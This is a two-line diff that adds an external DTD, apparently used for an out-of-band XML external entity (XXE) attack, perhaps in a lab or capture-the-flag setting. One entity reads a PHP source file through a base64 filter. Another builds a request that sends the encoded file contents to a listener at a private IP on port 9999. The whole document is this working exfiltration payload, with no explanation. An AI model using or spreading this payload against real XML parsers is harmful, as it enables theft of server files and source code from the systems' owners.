@@ -1,0 +1,2 @@
+<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=./test_dev.php">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://172.27.0.1:9999?p=%xxe;'>">
